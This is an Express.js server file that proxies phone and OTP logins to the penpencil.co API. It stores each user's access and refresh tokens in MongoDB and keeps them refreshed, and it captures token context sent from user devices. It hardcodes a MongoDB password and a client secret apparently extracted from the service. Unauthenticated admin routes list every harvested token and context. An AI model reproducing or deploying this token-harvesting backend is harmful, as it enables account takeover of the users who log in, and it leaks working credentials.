import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch';
import { v4 as uuidv4 } from 'uuid';
import { Token, Heartbeat, ContextCapture } from './models/Token.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// --- PRODUCTION SERVING (Disable on Vercel) ---
// Vercel handles static serving of the 'dist' folder automatically via the frontend config.
// Express static serving is ONLY needed for tradition VPS deployment.
if (process.env.NODE_ENV === 'production' && !process.env.VERCEL) {
  app.use(express.static(path.join(__dirname, '../dist')));

  app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../dist/index.html'));
  });
}

const MONGODB_URI = "mongodb+srv://developerbhanuyadav_db_user:2k6WfIq4NX9wv6BJ@cluster0.pgtuzkp.mongodb.net/?appName=Cluster0";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ Connected to MongoDB'))
  .catch(err => console.error('❌ MongoDB Connection Error:', err));

// PW Configuration from Analysis
const PW_ORG_ID = "5eb393ee95fab7468a79d189";
const PW_CLIENT_ID = "system-admin";
const PW_CLIENT_SECRET = "KjPXuAVfC5xbmgreETNMaL7z";

// --- AUTH ENDPOINTS ---

// Send OTP
app.post('/api/auth/get-otp', async (req, res) => {
  const { phone } = req.body;
  const randomId = uuidv4();

  try {
    const response = await fetch(`https://api.penpencil.co/v1/users/get-otp?smsType=0&fallback=true`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'client-id': PW_ORG_ID,
        'client-type': 'WEB',
        'randomid': randomId,
        'x-sdk-version': '0.0.12'
      },
      body: JSON.stringify({
        username: phone,
        countryCode: "+91",
        organizationId: PW_ORG_ID
      })
    });

    const data = await response.json();
    res.json({ ...data, randomId });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Verify OTP & Save Token
app.post('/api/auth/verify-otp', async (req, res) => {
  const { phone, otp, randomId, ownerName } = req.body;

  try {
    const response = await fetch(`https://api.penpencil.co/v3/oauth/token`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'client-id': PW_ORG_ID,
        'client-type': 'WEB',
        'randomid': randomId,
        'x-sdk-version': '0.0.12'
      },
      body: JSON.stringify({
        username: phone,
        otp: otp,
        client_id: PW_CLIENT_ID,
        client_secret: PW_CLIENT_SECRET,
        grant_type: "password",
        organizationId: PW_ORG_ID,
        latitude: 0,
        longitude: 0
      })
    });

    const body = await response.json();

    if (body.success && body.data) {
      const { access_token, refresh_token } = body.data;

      // Save or Update Token in DB
      await Token.findOneAndUpdate(
        { phone },
        {
          accessToken: access_token,
          refreshToken: refresh_token,
          ownerName,
          randomId,
          lastUpdated: new Date(),
          tokenStatus: true
        },
        { upsert: true, new: true }
      );

      res.json({ success: true, data: body.data });
    } else {
      res.status(400).json(body);
    }
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Capture Context (TOKEN_CONTEXT from frontend - with deduplication)
app.post('/api/auth/capture-context', async (req, res) => {
  const { deviceId, context } = req.body;
  console.log('📥 Capture Request Received from:', deviceId);
  if (!context) return res.status(400).json({ error: "No context" });

  try {
    // Advanced Deduplication: Check if last capture for this device is identical
    const lastCapture = await ContextCapture.findOne({ deviceId }).sort({ capturedAt: -1 });
    if (lastCapture && JSON.stringify(lastCapture.context) === JSON.stringify(context)) {
      console.log('⏭️  Duplicate context for', deviceId, '- Skipping save.');
      return res.json({ success: true, message: "Duplicate, skipped" });
    }

    const capture = new ContextCapture({ deviceId, context });
    await capture.save();
    console.log('✅ Context Saved Successfully for:', deviceId);
    res.json({ success: true, id: capture._id });
  } catch (err) {
    console.error('❌ Capture Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// --- ADMIN ENDPOINTS ---

// List All Tokens
app.get('/api/admin/tokens', async (req, res) => {
  try {
    const tokens = await Token.find().sort({ lastUpdated: -1 });
    res.json({ success: true, count: tokens.length, tokens });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Refresh All Tokens (Manual logic from user)
app.post('/api/admin/tokens/refresh-all', async (req, res) => {
  try {
    const tokens = await Token.find({ tokenStatus: true });
    let refreshedCount = 0;

    for (const token of tokens) {
      if (!token.refreshToken) continue;
      const randomId = uuidv4();

      try {
        const response = await fetch("https://api.penpencil.co/v3/oauth/refresh-token", {
          method: "POST",
          headers: { "Content-Type": "application/json", Randomid: randomId },
          body: JSON.stringify({
            refresh_token: token.refreshToken,
            client_id: "system-admin",
          }),
        });

        if (!response.ok) throw new Error("Refresh failed");

        const { data } = await response.json();

        await Token.findByIdAndUpdate(token._id, {
          accessToken: data.access_token,
          refreshToken: data.refresh_token,
          randomId,
          lastUpdated: new Date(),
          tokenStatus: true
        });
        refreshedCount++;
      } catch (err) {
        console.error(`Failed to refresh token for ${token.phone}:`, err.message);
        await Token.findByIdAndUpdate(token._id, { tokenStatus: false });
      }
    }

    res.json({ success: true, refreshedCount });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Manual Upsert Token
app.post('/api/admin/tokens/manual', async (req, res) => {
  const { phone, ownerName, accessToken, refreshToken } = req.body;
  try {
    await Token.findOneAndUpdate(
      { phone },
      { ownerName, accessToken, refreshToken, lastUpdated: new Date(), tokenStatus: true },
      { upsert: true }
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Get Captured Contexts (for Admin)
app.get('/api/admin/contexts', async (req, res) => {
  try {
    const contexts = await ContextCapture.find().sort({ capturedAt: -1 }).limit(100);
    res.json({ success: true, contexts });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- HEARTBEAT & STATS ---

app.post('/api/heartbeat', async (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) return res.status(400).json({ error: "Missing deviceId" });

  try {
    await Heartbeat.findOneAndUpdate(
      { deviceId },
      { lastActive: new Date() },
      { upsert: true }
    );
    // Count active heartbeats in last 2 minutes
    const onlineCount = await Heartbeat.countDocuments({
      lastActive: { $gt: new Date(Date.now() - 120000) }
    });
    res.json({ success: true, onlineUsers: Math.max(1, onlineCount) }); // Always show at least 1 online
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Catch-all route handled above for VPS only

const PORT = process.env.PORT || 80;

if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Production Server running on port ${PORT} (Publicly Accessible)`);
  });
}

export default app;
